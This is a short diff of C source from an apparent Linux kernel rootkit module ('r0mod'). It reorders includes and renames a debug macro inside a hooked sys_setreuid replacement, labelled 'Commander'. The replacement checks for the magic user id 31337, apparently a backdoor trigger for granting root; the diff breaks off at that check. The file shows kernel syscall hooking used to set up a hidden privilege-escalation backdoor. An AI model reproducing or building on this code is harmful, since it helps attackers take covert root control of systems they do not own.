@@ -1,9 +1,9 @@
 #include <linux/cred.h>
+#include <linux/uaccess.h>
+#include <asm/uaccess.h>
 
 #include <config.h>
 #include <r0mod/global.h>
-#include <linux/uaccess.h>
-#include <asm/uaccess.h>
 
 // Commander
 asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
@@ -11,7 +11,7 @@ asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid)
 {
     int ret;
 
-    DEBUG("[trying]: ruid == %d && euid == %d\n", ruid, euid);
+    DEBUG_HOOK("ruid == %d && euid == %d\n", ruid, euid);
 
     if(ruid == 31337)
     {
